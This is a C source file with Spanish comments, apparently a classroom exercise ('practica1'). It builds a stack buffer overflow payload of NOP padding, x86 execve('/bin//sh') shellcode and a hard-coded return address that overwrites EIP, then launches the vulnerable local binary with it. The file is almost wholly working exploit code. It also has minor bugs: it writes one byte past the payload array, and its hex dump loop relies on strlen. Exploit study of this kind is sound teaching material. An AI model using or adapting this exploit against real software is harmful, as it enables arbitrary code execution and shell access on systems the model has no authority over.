#include <stdio.h>    // entrada y salida estandar
#include <stdlib.h>   // funciones como malloc,calloc,exit()
#include <string.h>   // manipular bloques de string memset y memcpy
#include <unistd.h>   // funcion de ejecucion y llamadas al syscalls

int main()
{
  const int BYTE_PADDING_NOPS = 0x90;             // llegando a direccion de memeoria con no operations
  const int OFFSET_INIT = 4;                      // Para llenar nuestro payload
  const unsigned int FUNC_ADDR = 0xffffdef0;      // Direccion de memoria de retorno
  const int WORD_SIZE = sizeof(FUNC_ADDR);        // Tamaño de la direccion de memeoria.
  
  const unsigned char SHELL_CODE[] =
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        "\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

  const int SHELL_CODE_LENGHT = sizeof(SHELL_CODE);
  const int FINAL_PADDING = 44 - (OFFSET_INIT + SHELL_CODE_LENGHT); 
  const int PAYLOAD_LENGHT = OFFSET_INIT + SHELL_CODE_LENGHT + FINAL_PADDING + WORD_SIZE;     // tamaño total del payload

  printf("\n FINAL_PADDING : %d \n OFFSET_INIT: %d \n SHELL_CODE_LENGHT : %d \n WORD_SIZE : %d ", FINAL_PADDING, OFFSET_INIT, SHELL_CODE_LENGHT,WORD_SIZE); 
  printf("TOTAL : %d \n",PAYLOAD_LENGHT);
  printf("\n Empezando a llenar el payload ...");
  sleep(1);
  printf("\nDireccion de retorno: %p\n",FUNC_ADDR);
  printf("\n\nConstruyendo el payload... \n");
  sleep(1);
  

  char payload [PAYLOAD_LENGHT + 1];
  printf("\n Llenando payload de %d de caracteres NOP para meter shellcode \n",OFFSET_INIT);
  memset(payload, BYTE_PADDING_NOPS, OFFSET_INIT);
  sleep(1);
  printf("\n Sobreescribiendo en memoria con nuestro payload \n");
  // Ya tenemos -> NOPS + SHELLCODE + ____  + ____ + ____
  // Debemos llegar a 44 para nuestro override a EIP
  memcpy(payload + OFFSET_INIT , SHELL_CODE , SHELL_CODE_LENGHT);
  usleep(1);
  printf("\n Colocando PADDING \n");
  memset(payload + OFFSET_INIT + SHELL_CODE_LENGHT, BYTE_PADDING_NOPS, FINAL_PADDING);
  // NOPS + SHELL_CODE + PADDING FINAL
  // Ahora solo debemos pegar la funcion de retorno 
  // NOPS + SHELL_CODE_LENGHT + FINAL_PADDING + ___ 
  memcpy(payload + SHELL_CODE_LENGHT + OFFSET_INIT + FINAL_PADDING, &FUNC_ADDR, WORD_SIZE);
  payload[PAYLOAD_LENGHT+1] = '\0';


  for (int i = 0; i < strlen((char*)payload); i++)
    printf("\n %d HEX -> \\x%02x", i, (unsigned char)payload[i]);


  printf("\n Payload Listo..\n");
  printf("\n Ejecutando exploit ...\n");
  char *argv[] = {"./practica1", payload, NULL};
  execve(argv[0], argv , NULL);
  perror("execve"); 
  return 0;
}
